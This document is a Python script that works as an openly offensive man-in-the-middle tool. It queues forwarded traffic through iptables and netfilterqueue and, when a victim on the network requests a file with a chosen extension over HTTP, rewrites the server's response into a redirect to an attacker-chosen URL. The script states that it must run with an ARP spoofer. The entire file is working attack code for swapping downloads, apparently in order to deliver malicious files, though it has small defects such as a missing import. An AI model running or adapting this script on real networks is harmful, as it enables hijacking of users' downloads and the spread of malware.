#!/usr/bin/env python
############################# [ IMPORTS ] #############################

import netfilterqueue, subprocess, os, argparse
from scapy.all import *

############################# [ VARIABLES ] #############################

ackList = []  # List of ack number in the whole NFQUEUE 

############################# [ FUNCTIONS ] #############################
# Handling the args
def getArgs():
    parser = argparse.ArgumentParser()  # Create an object to get args
    # Options of this program
    parser.add_argument("-Q","-q", "--queue_num", dest="queue", help="Number of the queue to use", type=int)
    parser.add_argument("-E","-e", "--file_ext", dest="fileext", help="Extension to look for)", type=str)
    parser.add_argument("-U", "-u", "--url", dest="url", help="File URL to replace with", type=str)
    options = parser.parse_args()
    # print(parser.parse_args())
    if not options.queue:  # Check if queue number is empty
        parser.error("\n[-] Please specify a queue number to use, use --help for more info.")

    if not options.fileext:  # Check if file extension is empty
        parser.error("\n[-] Please specify a file extension to look for, use --help for more info.")
    else :
       if options.fileext.startswith("."): 
            options.fileext = options.fileext[1:] # Remove [.] 
    
    if not options.url:  # Check if url is empty
        parser.error("\n[-] Please specify a url for the file to replace with, use --help for more info.")
    else:
        try:  # Check if URL exists
            response = requests.head(options.url) 
        except requests.exceptions.RequestException:
            parser.error("\n[-] Please specify a valid url, use --help for more info.")
    return options

# --------------------------------------------------
# Funtion to handle packet in the NFQUEUE
def handlePacket(packet):
    pkt = IP(packet.get_payload())  # Convert the packet to a scapy packet.
    if pkt.haslayer(Raw):  # Intercept only packet with HTTP layer with useful data
        try:
            if pkt[TCP].dport == 80:
                if options.fileext.encode() in pkt[Raw].load:
                    print(f"\n[+] Found a download request for a {options.fileext} file")
                    ackList.append(pkt[TCP].ack)  # Add the ack number in the list for global use
            elif pkt[TCP].sport == 80:
                if pkt[TCP].seq in ackList:
                    ackList.remove(pkt[TCP].seq)  # Delete the ack number without knowing its index
                    print("\n[+] Now replacing file to the file mentioned...")
                    pkt[Raw].load = f"HTTP/1.1 301 Moved Permanently\nLocation: {options.url}\n\n"

                    # Make sure these fields do not corrupt packets (with 'del' it will recalculate them automatically)
                    del pkt[IP].len
                    del pkt[IP].chksum
                    del pkt[TCP].len
                    del pkt[TCP].chksum
                    pkt.set_payload(bytes(pkt))
        except IndexError:
            pass
    packet.accept()



############################# [ LAUNCH ] #############################

# /!\ NEED to be run with ARP_Spoof.py and in root

options = getArgs()

queue = netfilterqueue.NetfilterQueue()
queue.bind(options.queue, handlePacket)

try:
    #Check if user is root
    if not os.geteuid()==0:
        print('\n[-] This script must be run as root!')
        exit(1)
     else:
        subprocess.run(f"sudo iptables -I FORWARD -j NFQUEUE --queue-num {options.queue}", shell=True)  # MITM 
        # subprocess.run(f"sudo iptables -I INPUT -j NFQUEUE --queue-num {options.queue}", shell=True)  # Current machine
        # subprocess.run(f"sudo iptables -I OUTPUT -j NFQUEUE --queue-num {options.queue}", shell=True)
        while True:
            queue.run()
except KeyboardInterrupt:
    print("\n[-] Exiting program ... ")
    subprocess.run(f"sudo iptables -D FORWARD -j NFQUEUE --queue-num {options.queue}", shell=True)
    # subprocess.run(f"sudo iptables -D INPUT -j NFQUEUE --queue-num {options.queue}", shell=True)
    # subprocess.run(f"sudo iptables -D OUTPUT -j NFQUEUE --queue-num {options.queue}", shell=True)
except Exception as e:
    print("\n[-] Error during the running ... ")
    subprocess.run(f"sudo iptables -D FORWARD -j NFQUEUE --queue-num {options.queue}", shell=True)
    # subprocess.run(f"sudo iptables -D INPUT -j NFQUEUE --queue-num {options.queue}", shell=True)
    # subprocess.run(f"sudo iptables -D OUTPUT -j NFQUEUE --queue-num {options.queue}", shell=True)
    print(f"\n[-] {e}")
    exit(1)
    #time.sleep(0.052)
    #time.sleep(0.045)
